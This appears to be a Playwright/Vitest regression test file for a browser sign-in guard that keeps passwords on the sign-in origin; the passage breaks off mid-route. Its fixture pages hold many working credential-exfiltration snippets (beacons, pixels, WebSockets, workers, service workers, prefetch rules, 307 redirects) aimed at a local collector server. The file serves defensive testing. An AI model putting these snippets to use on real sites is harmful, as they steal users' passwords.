/**
 * signIn keeps the password on the sign-in page's origin (0.6.0 review; docs/v2-spec.md "Signing in" and "Sign-in:
 * two-step and sessionStorage"): a request that would carry it to another origin, whatever sends it, is stopped before
 * it leaves the browser, and signing in then fails with "…sends the password to <origin>…" (or the request is stopped
 * and signing in goes on). Regression tests for the review's fixes (auth.ts stopUnrouted and carriesPassword):
 * - requests Playwright's routes never see: an unload beacon, a keepalive fetch, fetchLater and an image sent from a
 *   pagehide handler, and a form POST answered with a 307 (the browser re-sends the body to wherever it points);
 * - WebSockets: the password in the handshake's address, or in a message on a socket opened before it was typed;
 * - the password in an address's user name and password (http://u:<password>@host/, answered on a 401 challenge);
 * - the password JSON-escaped and then percent-encoded (`data=` + encodeURIComponent(JSON.stringify(…))), in a body and
 *   in a query;
 * - a common password ("demo") that is in many addresses still signs in: nothing is read before it is typed, only a
 *   whole path segment counts, and the Referer's host name is never read.
 *
 * Round 2 of the 0.6.0 review adds:
 * - the password in a cross-origin iframe's address, an EventSource's address and a top-level navigation's address;
 * - a sign-in form with target=_blank whose POST is answered with a 307 to the other origin: the new tab's redirect hop
 *   is sent before Playwright reports the tab, so only a tab held before it runs (guardSignInBrowser) stops it;
 * - a service worker registered from the sign-in origin (the context blocks service workers);
 * - speculation-rules prefetches the in-page strip used to miss (a rules script nested below <body>, one whose type is
 *   changed after it was inserted) and a Speculation-Rules response header (dropped by guardSignInBrowser);
 * - a page that closes its own tab with a pagehide send;
 * - a strong password in a same-origin request's address (stopped), while a weak one is stopped in a navigation's
 *   query, and in a script's request only under a key that names a password (?password=, &pwd=; ?user=demo goes);
 * - a weak password inside a longer JSON string or a Basic header's value on another origin (not a leak: signs in);
 * - a popup the landing page opens while Run Hound's sessionStorage probe is being opened (its redirect hop is stopped);
 * - workers that run even though the page's Worker/SharedWorker constructors were not replaced: a dedicated worker stays
 *   paused (stopUnrouted) and a shared worker is closed (guardSignInBrowser) before either runs.
 *
 * Round 3 adds:
 * - the password inside a path segment with other characters around it (/steal/<password>x, /log-<password>-end.gif),
 *   on another origin: a strong password is looked for anywhere in the path, a weak one only as a whole segment;
 * - the password requested as a WebSocket subprotocol (new WebSocket(url, [password]): the handshake's
 *   Sec-WebSocket-Protocol header), with a password that is a valid subprotocol token (TOKEN_SAFE); a subprotocol that
 *   isn't the password still connects.
 *
 * The whole suite's load (0.6.0) adds:
 * - tabs a page opens while this process is held (GET /stall answers, then holds it), so the browser has shown each
 *   before Run Hound or Playwright hears of it: Run Hound closed such a tab before Playwright had let it go, the
 *   renderer the tab shares with the sign-in page stayed paused, and signIn never returned.
 *
 * Each leaking page is first driven by hand in a plain browser (`plain`, one no signIn ever uses, so a guard a failed
 * signIn left behind can't stop the leak), which shows the leak reaches the other origin: so each signIn test fails
 * only for signIn's reasons. Each page also reports, to its own origin, that it tried (a synchronous XHR before a
 * request that gets stopped, so the report is in before signIn fails; a beacon from pagehide, where a synchronous XHR
 * isn't allowed). What must happen is waited for as it happens (the collector's receipt, the report's arrival, a
 * request), never for a set time; only what must not happen gets a set time to show up (settle).
 *
 * The other origin is `collector`: an HTTP server on another port that records every request, speaks enough of the
 * WebSocket protocol to record handshakes and text messages, answers CORS preflights, and answers /auth with a Basic
 * challenge.
 */
import { createHash } from "node:crypto";
import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo, Socket } from "node:net";
import { chromium, type Browser } from "playwright";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { closeBrowser, getBrowser } from "../../test-support/harness.js";
import { json, startFixtureServer, type FixtureServer } from "../../test-support/server.js";
import type { TestAccount } from "../interfaces/accounts.js";
import { guardSignInBrowser, signIn, SignInError, stopUnrouted, type SignedIn } from "./auth.js";

const EMAIL = "someone@example.test";
/**
 * Every character a form body, a JSON body and an address encode their own way: a space, a quote and a backslash (JSON
 * escapes both), ( ) ! ~ (encodeURIComponent keeps them, a form body doesn't), @ (userinfo).
 */
const PASSWORD = `q"uo\\te (pw)!~@7391`;
/** A common password, in many an address: it must still sign in (only a request that carries it is stopped). */
const COMMON = "demo";
/**
 * A short, all-word-character password that is a substring of a longer token ("latest") an app puts in another
 * origin's address: it is not a leak, so sign-in must still succeed (0.6.0 review, `includesNeedle`'s token boundary).
 */
const WEAK_SUBSTRING = "test";
/**
 * A strong password that is a valid WebSocket subprotocol token (RFC 6455: letters and digits are token characters), so
 * a page can request it as one: `new WebSocket(url, [password])` sends it in the handshake's Sec-WebSocket-Protocol
 * header. PASSWORD has characters a subprotocol can't hold (the constructor throws on it), so the LEAKS pages can't.
 */
const TOKEN_SAFE = "abc123XYZ789def";
/**
 * A host the safety gate refuses (an identity provider on the internet, as far as the gate knows: REFUSED_SSO says it
 * is public). A browser launched with --host-resolver-rules sends it to 127.0.0.1, so whatever got through would reach
 * the collector and be recorded there.
 */
const SSO_HOST = "sso.example.test";
const REFUSED_SSO = { lookup: async (host: string) => (host === SSO_HOST ? ["93.184.216.34"] : ["127.0.0.1"]) };

/** What the collector saw: an HTTP request, a WebSocket handshake, or a text message on a WebSocket. */
interface Seen {
  kind: "http" | "ws" | "ws-message";
  method: string;
  url: string;
  headers: IncomingMessage["headers"];
  body: string;
}

interface Collector {
  url: string;
  seen: Seen[];
  /** The first request `match` accepts, recorded already or when it arrives: the collector's receipt, not a poll. */
  received(match: (seen: Seen) => boolean): Promise<Seen>;
  close(): Promise<void>;
}

/** The WebSocket handshake's accept value (RFC 6455, 4.2.2). */
const acceptKey = (key: string) => createHash("sha1").update(`${key}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64");

/** Reads the client's frames (always masked) from `socket` and records each text or binary message's payload. */
function readFrames(socket: Socket, onMessage: (text: string) => void): void {
  let buffer = Buffer.alloc(0);
  socket.on("data", (chunk: Buffer) => {
    buffer = Buffer.concat([buffer, chunk]);
    for (;;) {
      if (buffer.length < 2) return;
      const opcode = buffer[0]! & 0x0f;
      const masked = (buffer[1]! & 0x80) !== 0;
      let length = buffer[1]! & 0x7f;
      let offset = 2;
      if (length === 126) {
        if (buffer.length < 4) return;
        length = buffer.readUInt16BE(2);
        offset = 4;
      } else if (length === 127) {
        if (buffer.length < 10) return;
        length = Number(buffer.readBigUInt64BE(2));
        offset = 10;
      }
      const maskLength = masked ? 4 : 0;
      if (buffer.length < offset + maskLength + length) return;
      const mask = buffer.subarray(offset, offset + maskLength);
      const payload = Buffer.from(buffer.subarray(offset + maskLength, offset + maskLength + length));
      if (masked) for (let i = 0; i < payload.length; i++) payload[i]! ^= mask[i % 4]!;
      buffer = buffer.subarray(offset + maskLength + length);
      if (opcode === 1 || opcode === 2) onMessage(payload.toString("utf8"));
      if (opcode === 8) {
        socket.end();
        return;
      }
    }
  });
}

async function startCollector(): Promise<Collector> {
  const seen: Seen[] = [];
  const waiters = new Set<{ match: (seen: Seen) => boolean; resolve: (seen: Seen) => void }>();
  const record = (entry: Seen) => {
    seen.push(entry);
    for (const waiter of waiters) {
      if (!waiter.match(entry)) continue;
      waiters.delete(waiter);
      waiter.resolve(entry);
    }
  };
  const server: Server = createServer(async (req, res) => {
    const chunks: Buffer[] = [];
    for await (const chunk of req) chunks.push(chunk as Buffer);
    const url = req.url ?? "/";
    record({ kind: "http", method: req.method ?? "GET", url, headers: req.headers, body: Buffer.concat(chunks).toString("utf8") });
    const path = new URL(url, "http://x").pathname;
    if (path === "/auth" && !req.headers.authorization) {
      res.writeHead(401, { "www-authenticate": 'Basic realm="collector"', "content-type": "text/plain" });
      return void res.end("Who are you?");
    }
    if (path === "/auth" || path === "/landing") {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      return void res.end("<!doctype html><title>Elsewhere</title><h1>Elsewhere</h1>");
    }
    // A CORS preflight (a fetch with an Authorization header): let it through, so the request itself is sent.
    res.writeHead(204, { "access-control-allow-origin": "*", "access-control-allow-headers": "authorization, content-type" });
    res.end();
  });
  const sockets = new Set<Socket>();
  server.on("connection", (socket: Socket) => {
    sockets.add(socket);
    socket.on("close", () => sockets.delete(socket));
  });
  server.on("upgrade", (req: IncomingMessage, socket: Socket) => {
    const url = req.url ?? "/";
    record({ kind: "ws", method: "GET", url, headers: req.headers, body: "" });
    socket.on("error", () => undefined);
    const key = req.headers["sec-websocket-key"];
    if (typeof key !== "string") return void socket.destroy();
    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${acceptKey(key)}\r\n\r\n`);
    readFrames(socket, (text) => record({ kind: "ws-message", method: "MESSAGE", url, headers: req.headers, body: text }));
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address() as AddressInfo;
  return {
    url: `http://127.0.0.1:${port}`,
    seen,
    received: (match) => {
      const found = seen.find(match);
      return found ? Promise.resolve(found) : new Promise<Seen>((resolve) => waiters.add({ match, resolve }));
    },
    close: () =>
      new Promise<void>((resolve) => {
        for (const socket of sockets) socket.destroy();
        server.close(() => resolve());
      }),
  };
}

let browser: Browser;
/**
 * A browser Run Hound never signs in with, for the "by hand" controls: a guard left attached to `browser` by a signIn
 * that never returned (it checks every request of the browser) can't stop the leak a control must show.
 */
let plain: Browser;
/** The sign-in page's origin. */
let site: FixtureServer;
/** Another origin, where the password must never arrive. */
let collector: Collector;

/** decodeURIComponent with "+" as a space, as many times as it changes something; the text as it is when malformed. */
function decodedFully(text: string): string {
  let out = text;
  for (let i = 0; i < 3; i++) {
    let next: string;
    try {
      next = decodeURIComponent(out.replace(/\+/g, " "));
    } catch {
      return out;
    }
    if (next === out) return out;
    out = next;
  }
  return out;
}

/** True when `text` holds `secret`: raw, percent-decoded, JSON-escaped, or in a Basic header. */
function holds(text: string, secret: string): boolean {
  const escaped = JSON.stringify(secret).slice(1, -1);
  const views = [text, decodedFully(text)];
  const basic = /^basic\s+([A-Za-z0-9+/=_-]+)\s*$/i.exec(text);
  if (basic) views.push(Buffer.from(basic[1]!, "base64").toString("utf8"));
  return views.some((v) => v.includes(secret) || v.includes(escaped));
}

/** Whether what the collector saw carries `secret`: in its address, its body or any header. */
const carrying =
  (secret = PASSWORD) =>
  (s: Seen): boolean =>
    [s.url, s.body, ...Object.values(s.headers).flat().filter((v): v is string => typeof v === "string")].some((t) => holds(t, secret));

/** What reached the collector carrying `secret`, as "<kind> <method> <url>". */
function leaks(secret = PASSWORD): string[] {
  return collector.seen.filter(carrying(secret)).map((s) => `${s.kind} ${s.method} ${s.url}`);
}

/** The attempts the pages reported to their own origin (`what` of /api/attempted?what=…), in order. */
function attempts(): string[] {
  return site.requests.filter((r) => r.url.startsWith("/api/attempted?")).map((r) => new URL(r.url, "http://x").searchParams.get("what") ?? "");
}

/** Waiting for a report of an attempt (see attempted); resolved by the /api/attempted route when it comes in. */
const attemptWaiters = new Set<{ what: string; resolve: () => void }>();

/** Resolves once the page has reported to its own origin that it tried `what`: already, or when the report comes in. */
function attempted(what: string): Promise<void> {
  if (attempts().includes(what)) return Promise.resolve();
  return new Promise((resolve) => attemptWaiters.add({ what, resolve }));
}

/**
 * `event` (a receipt, a report, a request), or a failure that says what never happened. The bound only ends a wait
 * that failed, before the test's own timeout does so without saying why; nothing waits for it when the event comes.
 */
function soon<T>(event: Promise<T>, never: string): Promise<T> {
  let timer: NodeJS.Timeout | undefined;
  const failed = new Promise<never>((_, reject) => {
    timer = setTimeout(() => reject(new Error(never)), 45_000);
  });
  return Promise.race([event, failed]).finally(() => clearTimeout(timer));
}

const shell = (title: string, body: string) => `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title></head><body><main>${body}</main></body></html>`;

/**
 * A sign-in page (email, password, Sign in) whose submit posts both to /api/login and, once signed in, goes to /home.
 * `script` sets the page's hooks on LEAK: onLoad(), onSubmit(pw) (before the sign-in request), signedIn(pw) (after it
 * succeeded, before leaving), next(pw) (where to go instead of /home) and delay (ms before leaving). C is the
 * collector's address, W the same as ws://, and tried(what) reports an attempt to the page's own origin (a beacon, so
 * it gets out of a page being left too). triedNow(what) reports it with a synchronous XHR, done before the next
 * statement: for the hooks whose next request gets stopped (signIn then fails and closes the page at once, and a beacon
 * queued just before may never be sent). Chromium forbids a synchronous XHR in pagehide, where tried is used.
 */
function signInPage(script: string, formAttributes = ""): string {
  return shell(
    "Sign in",
    `<h1>Sign in</h1>
<form id="f" aria-label="Sign in" ${formAttributes}><label for="e">Email</label><input id="e" name="email" type="email" autocomplete="username">
<label for="pw">Password</label><input id="pw" name="password" type="password" autocomplete="current-password"><button type="submit">Sign in</button>
<p role="alert" id="err" hidden></p></form>
<script>
var C = ${JSON.stringify(collector.url)}, W = C.replace(/^http/, "ws");
var LEAK = {};
function tried(what) { navigator.sendBeacon("/api/attempted?what=" + what); }
function triedNow(what) { var x = new XMLHttpRequest(); x.open("POST", "/api/attempted?what=" + what, false); x.send(); }
${script}
if (LEAK.onLoad) LEAK.onLoad();
var form = document.getElementById("f");
if (!form.getAttribute("action")) form.addEventListener("submit", function (e) {
  e.preventDefault();
  var pw = document.getElementById("pw").value;
  if (LEAK.onSubmit) LEAK.onSubmit(pw);
  fetch("/api/login", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: document.getElementById("e").value, password: pw }) })
    .then(function (r) {
      if (!r.ok) { var a = document.getElementById("err"); a.textContent = "Email or password is incorrect"; a.hidden = false; return; }
      if (LEAK.signedIn) LEAK.signedIn(pw);
      var next = LEAK.next ? LEAK.next(pw) : "/home";
      setTimeout(function () { location.assign(next); }, LEAK.delay || 0);
    });
});
</script>`,
  );
}

/**
 * A two-step sign-in form (0.6.0): the email and Continue; the first submit shows the password row (the page's own
 * script), the second is the browser's own form POST to `action`, email and password in the body.
 */
function twoStepPage(action: string): string {
  return shell(
    "Sign in",
    `<h1>Sign in</h1>
<form id="signin" aria-label="Sign in" method="post" action="${action}">
<label for="li-email">Email</label><input id="li-email" type="email" name="email" autocomplete="username">
<p id="li-pass-row" hidden><label for="li-pass">Password</label><input id="li-pass" type="password" name="password" autocomplete="current-password"></p>
<button type="submit">Continue</button></form>
<script>
var form = document.getElementById("signin"), first = true;
form.addEventListener("submit", function (e) {
  if (!first) { navigator.sendBeacon("/api/attempted?what=password-step"); return; }
  e.preventDefault();
  first = false;
  document.getElementById("li-pass-row").hidden = false;
  document.getElementById("li-pass").focus();
});
</script>`,
  );
}

/**
 * A sign-in page that, once the password is entered and /api/login answers 200, runs `exfil` (a statement with `pw`,
 * `C` the collector's address and `W` the same as ws://, `tried(what)` a same-origin beacon, `triedNow(what)` the same
 * as a synchronous XHR) and then removes the form without navigating — so the page stays alive for a channel that would
 * carry the password out (a worker, a popup, a prefetch), and sign-in still succeeds (the password field is gone). Used
 * for the 0.6.0-review channels the routes never see: with the guarded context those channels are closed, so the
 * password never reaches the collector. With `finish` "when-done", the form stays until `exfil` calls done().
 */
function exfilPage(exfil: string, finish: "now" | "when-done" = "now"): string {
  return shell(
    "Sign in",
    `<h1>Sign in</h1>
<form id="f" aria-label="Sign in"><label for="e">Email</label><input id="e" name="email" type="email" autocomplete="username">
<label for="pw">Password</label><input id="pw" name="password" type="password" autocomplete="current-password"><button type="submit">Sign in</button>
<p role="alert" id="err" hidden></p></form>
<h2 id="ok" hidden>Signed in.</h2>
<script>
var C = ${JSON.stringify(collector.url)}, W = C.replace(/^http/, "ws");
function tried(what) { navigator.sendBeacon("/api/attempted?what=" + what); }
function triedNow(what) { var x = new XMLHttpRequest(); x.open("POST", "/api/attempted?what=" + what, false); x.send(); }
function done() { var f = document.getElementById("f"); if (f) f.remove(); document.getElementById("ok").hidden = false; }
document.getElementById("f").addEventListener("submit", function (e) {
  e.preventDefault();
  var pw = document.getElementById("pw").value;
  fetch("/api/login", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: document.getElementById("e").value, password: pw }) })
    .then(function (r) {
      if (!r.ok) { var a = document.getElementById("err"); a.textContent = "Email or password is incorrect"; a.hidden = false; return; }
      try { ${exfil} } catch (err) {}
      ${finish === "now" ? "done();" : ""}
    });
});
</script>`,
  );
}

/** The page /bounce-tab that a popup opens: it reads the password from window.name and POSTs it to /bounce (a 307). */
const bounceTabPage = () =>
  shell(
    "Bounce",
    `<form id="bf" method="post" action="/bounce"><input name="password"></form>
<script>document.querySelector("[name=password]").value = window.name; document.getElementById("bf").submit();</script>`,
  );

/** The exfil statements for the 0.6.0-review channels (each reports its attempt with tried, then tries to leak `pw`). */
const CHANNELS = {
  "worker-shared": `tried("worker-shared"); var s = new SharedWorker("/exfil-shared-worker.js"); s.port.start(); s.port.postMessage(pw);`,
  "worker-ws": `tried("worker-ws"); var w = new Worker("/exfil-dedicated-worker.js"); w.postMessage(pw);`,
  popup: `tried("popup"); var win = window.open("/bounce-tab", "_blank"); if (win) win.name = pw;`,
  prefetch: `tried("prefetch"); var sr = document.createElement("script"); sr.type = "speculationrules"; sr.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [C + "/prefetched?p=" + encodeURIComponent(pw)] }] }); document.body.appendChild(sr);`,
  // A rules script inserted below <body> (inside <main>), not as one of its children.
  "prefetch-nested": `tried("prefetch-nested"); var sr = document.createElement("script"); sr.type = "speculationrules"; sr.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [C + "/prefetched-nested?p=" + encodeURIComponent(pw)] }] }); var box = document.createElement("div"); document.querySelector("main").appendChild(box); box.appendChild(sr);`,
  // A script inserted as text/plain (not a rules script then), made one afterwards: changing its type does nothing
  // until its children change, and then the browser reads it as speculation rules.
  "prefetch-retype": `tried("prefetch-retype"); var sr = document.createElement("script"); sr.type = "text/plain"; sr.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [C + "/prefetched-retype?p=" + encodeURIComponent(pw)] }] }); document.body.appendChild(sr); setTimeout(function () { sr.type = "speculationrules"; sr.appendChild(document.createTextNode(" ")); }, 50);`,
  // The page is served with a Speculation-Rules header whose document rules prefetch any link to the collector at
  // once: a link with the password is enough (no script element at all).
  "prefetch-header": `tried("prefetch-header"); var a = document.createElement("a"); a.href = C + "/prefetched-header?p=" + encodeURIComponent(pw); a.textContent = "Continue"; document.querySelector("main").appendChild(a);`,
  // A service worker registered from the sign-in origin, handed the password, fetches the collector.
  "service-worker": `tried("service-worker"); navigator.serviceWorker.register("/exfil-sw.js").then(function () { return navigator.serviceWorker.ready; }).then(function (reg) { reg.active.postMessage(pw); });`,
} as const;

/** One way a page tries to get the password to the collector. */
interface Leak {
  name: string;
  /** What the page does, in the test's title. */
  does: string;
  script: string;
  formAttributes?: string;
  /** The page doesn't move on when submitted (the leak goes out from another tab): by hand, wait for the collector. */
  stays?: true;
  /** What signIn says when it fails, instead of "…sends the password to <collector>…". */
  says?: RegExp;
}

/** Sends `send` (a statement using pw) from a pagehide handler registered once signed in, after reporting the attempt. */
const onPagehide = (name: string, send: string) =>
  `LEAK.signedIn = function (pw) { addEventListener("pagehide", function () { tried(${JSON.stringify(name)}); ${send} }); };`;

const LEAKS: Leak[] = [
  {
    name: "beacon",
    does: "an unload beacon (navigator.sendBeacon from pagehide)",
    script: onPagehide("beacon", `navigator.sendBeacon(C + "/beacon", JSON.stringify({ password: pw }));`),
  },
  {
    name: "keepalive",
    does: "a keepalive fetch from pagehide",
    script: onPagehide("keepalive", `fetch(C + "/keepalive", { method: "POST", mode: "no-cors", keepalive: true, headers: { "content-type": "text/plain" }, body: pw });`),
  },
  {
    name: "later",
    does: "fetchLater from pagehide",
    script: onPagehide("later", `fetchLater(C + "/later", { method: "POST", body: pw });`),
  },
  {
    name: "image",
    does: "an image from pagehide",
    script: onPagehide("image", `new Image().src = C + "/pixel.gif?p=" + encodeURIComponent(pw);`),
  },
  {
    name: "redirect",
    does: "a form POST answered with a 307 to the other origin (the browser re-sends the body there)",
    script: `LEAK.onLoad = function () { document.getElementById("f").addEventListener("submit", function () { triedNow("redirect"); }); };`,
    formAttributes: `method="post" action="/bounce"`,
  },
  {
    name: "popup-form",
    does: "a form with target=_blank whose POST is answered with a 307 to the other origin, from the new tab",
    script: `LEAK.onLoad = function () { document.getElementById("f").addEventListener("submit", function () { triedNow("popup-form"); }); };`,
    formAttributes: `method="post" action="/bounce" target="_blank"`,
    stays: true,
    says: /opens a new tab or window/,
  },
  {
    name: "ws-url",
    does: "a WebSocket with the password in its address",
    script: `LEAK.onSubmit = function (pw) { triedNow("ws-url"); new WebSocket(W + "/ws?p=" + encodeURIComponent(pw)); };`,
  },
  {
    name: "ws-message",
    does: "a message with the password on a WebSocket opened before it was typed",
    script: `var ws; LEAK.onLoad = function () { ws = new WebSocket(W + "/ws"); };
LEAK.onSubmit = function (pw) { triedNow("ws-message"); ws.send(JSON.stringify({ password: pw })); };`,
  },
  {
    name: "iframe",
    does: "a frame from the other origin with the password in its address",
    script: `LEAK.onSubmit = function (pw) { triedNow("iframe"); var f = document.createElement("iframe"); f.src = C + "/frame?p=" + encodeURIComponent(pw); document.body.appendChild(f); };`,
  },
  {
    name: "event-source",
    does: "an EventSource with the password in its address",
    script: `LEAK.onSubmit = function (pw) { triedNow("event-source"); new EventSource(C + "/events?p=" + encodeURIComponent(pw)); };`,
  },
  {
    name: "navigation",
    does: "the next page on the other origin, with the password in its query (location.assign)",
    script: `LEAK.next = function (pw) { triedNow("navigation"); return C + "/landing?p=" + encodeURIComponent(pw); };`,
  },
  {
    name: "userinfo",
    does: "the password in the next address's user name and password (http://u:<password>@host/)",
    script: `LEAK.next = function (pw) { tried("userinfo"); return "http://u:" + encodeURIComponent(pw) + "@" + C.slice("http://".length) + "/auth"; };`,
  },
  {
    name: "json-form",
    does: "a form body with the password JSON-escaped and then percent-encoded (data=…)",
    script: `LEAK.onSubmit = function (pw) {
  triedNow("json-form");
  fetch(C + "/collect", { method: "POST", mode: "no-cors", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "data=" + encodeURIComponent(JSON.stringify({ password: pw })) });
};`,
  },
  {
    name: "json-query",
    does: "a query with the password JSON-escaped and then percent-encoded (?data=…)",
    script: `LEAK.onSubmit = function (pw) { triedNow("json-query"); new Image().src = C + "/collect.gif?data=" + encodeURIComponent(JSON.stringify({ password: pw })); };`,
  },
  // Round 3: the password inside a path segment with other characters around it (only a whole segment was matched).
  {
    name: "path-suffix",
    does: "an image with the password in a path segment, a character after it (/steal/<password>x)",
    script: `LEAK.onSubmit = function (pw) { triedNow("path-suffix"); new Image().src = C + "/steal/" + encodeURIComponent(pw) + "x"; };`,
  },
  {
    name: "path-inside",
    does: "an image with the password between other characters of its path (/log-<password>-end.gif)",
    script: `LEAK.onSubmit = function (pw) { triedNow("path-inside"); new Image().src = C + "/log-" + encodeURIComponent(pw) + "-end.gif"; };`,
  },
];

/** The password the sign-in endpoint received last: a page the app's own server builds with it (the probe-race tab). */
let lastPassword = "";

const escapeHtml = (text: string) => text.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");

/**
 * The probe race (0.6.0 review): the sign-in page moves on to a landing page on another origin (localhost instead of
 * 127.0.0.1, same server), so Run Hound opens its sessionStorage probe as a popup of the landing page. The landing
 * page has replaced window.open: before the probe, it opens its own tab on the sign-in origin, which posts the
 * password (the app's server put it in the page) to /bounce, a 307 to the collector.
 */
const probeRaceLanding = () =>
  shell(
    "Home",
    `<h1>Home</h1><p>Signed in.</p>
<script>
sessionStorage.setItem("theme", "dark");
var realOpen = window.open, signInOrigin = location.origin.replace("//localhost:", "//127.0.0.1:");
window.open = function () { realOpen.call(window, signInOrigin + "/probe-race/bounce-auto", "_blank"); return realOpen.apply(window, arguments); };
</script>`,
  );

/** A page that, once signed in, sends the password from pagehide and closes its own tab (window.close). */
const SELF_CLOSE = `tried("self-close"); addEventListener("pagehide", function () { navigator.sendBeacon(C + "/closed", pw); }); window.close();`;

/** How long GET /stall holds this process after it has answered. */
const STALL_MS = 1_000;
/** How many tabs /channel/popup-stalled opens, one after each /stall. */
const STALLED_ROUNDS = 3;

/**
 * The popup channel (CHANNELS.popup: a tab that POSTs the password to /bounce, a 307 to the collector), opened
 * STALLED_ROUNDS times, each right after GET /stall has answered and while it holds this process (signIn, Playwright
 * and both servers run here): the browser creates and shows the tab before Run Hound or Playwright hears of it, the
 * order a loaded machine makes by chance (0.6.0, the whole suite). The form stays until the last round (done()).
 */
const STALLED_POPUPS = `tried("popup-stalled"); var round = 0; (function next() {
  if (round++ >= ${STALLED_ROUNDS}) return done();
  fetch("/stall").then(function () { var win = window.open("/bounce-tab", "_blank"); if (win) win.name = pw; setTimeout(next, 50); });
})();`;

beforeAll(async () => {
  browser = await getBrowser();
  plain = await chromium.launch();
  collector = await startCollector();
  const pages: Record<string, string> = {};
  for (const leak of LEAKS) pages[`/leak/${leak.name}`] = signInPage(leak.script, leak.formAttributes);
  site = await startFixtureServer({
    pages: {
      ...pages,
      "/home": shell("Home", "<h1>Home</h1><p>Signed in.</p>"),
      // A common password in the sign-in page's own address (?mode=demo) and in the addresses of what the page loads
      // before it is typed; after signing in, the landing page loads a stylesheet whose path has it inside a segment.
      "/demo/sign-in": signInPage(`LEAK.onLoad = function () { new Image().src = C + "/demo.gif?theme=demo"; }; LEAK.next = function () { return "/signed-in"; };`),
      "/signed-in": shell("Home", `<link rel="stylesheet" href="${collector.url}/assets/demo-theme.css"><h1>Home</h1><p>Signed in.</p>`),
      // Two-step (0.6.0): the email and Continue, then the password on the same page, sent by the browser itself (a
      // classic form POST) to an address that answers with a redirect to the refused host.
      "/two/sign-in-307": twoStepPage("/two/password-307"),
      "/two/sign-in-302": twoStepPage("/two/password-302"),
      // 0.6.0 review channels the routes never see: a shared worker's fetch, a WebSocket opened inside a dedicated
      // worker, a popup that carries the password out on a redirect, and a speculation-rules prefetch.
      "/channel/worker-shared": exfilPage(CHANNELS["worker-shared"]),
      "/channel/worker-ws": exfilPage(CHANNELS["worker-ws"]),
      "/channel/popup": exfilPage(CHANNELS.popup),
      "/channel/prefetch": exfilPage(CHANNELS.prefetch),
      "/channel/prefetch-nested": exfilPage(CHANNELS["prefetch-nested"]),
      "/channel/prefetch-retype": exfilPage(CHANNELS["prefetch-retype"]),
      "/channel/service-worker": exfilPage(CHANNELS["service-worker"]),
      "/channel/self-close": exfilPage(SELF_CLOSE),
      "/channel/popup-stalled": exfilPage(STALLED_POPUPS, "when-done"),
      "/bounce-tab": bounceTabPage(),
      // 0.6.0 review weak-password false positives: a substring on another origin, and a same-origin query equal to a
      // weak password. Neither is a leak, so sign-in must still succeed.
      "/weak/substring": exfilPage(`new Image().src = C + "/pixel.png?ref=latest";`),
      "/weak/same-origin-query": exfilPage(`fetch("/api/state?user=demo");`),
      // A weak password under a password key in a same-origin script's request (not a navigation): a leak all the same.
      "/weak/same-origin-password-query": exfilPage(`triedNow("weak-password-query"); fetch("/api/state?password=" + encodeURIComponent(pw));`),
      "/weak/same-origin-pwd-image": exfilPage(`triedNow("weak-pwd-image"); new Image().src = "/api/state?user=x&pwd=" + encodeURIComponent(pw);`),
      // Round 2: a weak password inside a longer JSON string, and inside a Basic header's value, on another origin.
      "/weak/json-substring": exfilPage(`fetch(C + "/collect", { method: "POST", mode: "no-cors", headers: { "content-type": "text/plain" }, body: JSON.stringify({ v: "latest" }) });`),
      "/weak/basic-substring": exfilPage(`fetch(C + "/basic", { headers: { authorization: "Basic " + btoa("user:latest") } });`),
      // Round 2: a strong password in a same-origin request's address, as a query value and JSON-escaped in one.
      "/strong/same-origin-query": exfilPage(`triedNow("same-origin-query"); fetch("/api/state?p=" + encodeURIComponent(pw));`),
      "/strong/same-origin-json-query": exfilPage(`triedNow("same-origin-json-query"); fetch("/api/state?data=" + encodeURIComponent(JSON.stringify({ password: pw })));`),
      // Round 2: the probe race (probeRaceLanding). The sign-in page moves on to the landing page on localhost.
      "/probe-race/sign-in": signInPage(`LEAK.next = function () { return location.origin.replace("//127.0.0.1:", "//localhost:") + "/probe-race/landing"; };`),
      "/probe-race/landing": probeRaceLanding(),
      // Round 3: the password requested as a WebSocket subprotocol on submit, and a subprotocol that isn't the password
      // (graphql-ws) on a socket opened once signed in.
      "/leak-token/ws-protocol": signInPage(`LEAK.onSubmit = function (pw) { triedNow("ws-protocol"); new WebSocket(W + "/ws", [pw]); };`),
      "/weak/ws-protocol": exfilPage(`tried("ws-graphql"); new WebSocket(W + "/ws-graphql", ["graphql-ws"]);`),
    },
    routes: {
      "POST /api/login": (req, res) => {
        const body = JSON.parse(req.body || "{}") as { email?: string; password?: string };
        const ok = body.email === EMAIL && [PASSWORD, COMMON, WEAK_SUBSTRING, TOKEN_SAFE].includes(body.password ?? "");
        if (!ok) return json(res, 401, { error: "Email or password is incorrect" });
        lastPassword = body.password ?? "";
        res.writeHead(200, { "content-type": "application/json", "set-cookie": `sid=s${Date.now().toString(16)}a1b2c3d4e5f6; Path=/; HttpOnly; SameSite=Lax` });
        res.end(JSON.stringify({ ok: true }));
      },
      // The worker scripts the channel pages load, served from the sign-in origin.
      "GET /exfil-shared-worker.js": (_req, res) => {
        res.writeHead(200, { "content-type": "text/javascript" });
        res.end(`onconnect = (e) => { const p = e.ports[0]; p.onmessage = (m) => { fetch(${JSON.stringify(collector.url)} + "/from-shared-worker", { method: "POST", mode: "no-cors", body: m.data }); }; };`);
      },
      "GET /exfil-dedicated-worker.js": (_req, res) => {
        res.writeHead(200, { "content-type": "text/javascript" });
        res.end(`onmessage = (e) => { try { const ws = new WebSocket(${JSON.stringify(collector.url.replace(/^http/, "ws"))} + "/from-worker-ws"); ws.onopen = () => ws.send(e.data); } catch (x) {} };`);
      },
      // The service worker /channel/service-worker registers: it sends whatever the page posts it to the collector.
      "GET /exfil-sw.js": (_req, res) => {
        res.writeHead(200, { "content-type": "text/javascript" });
        res.end(
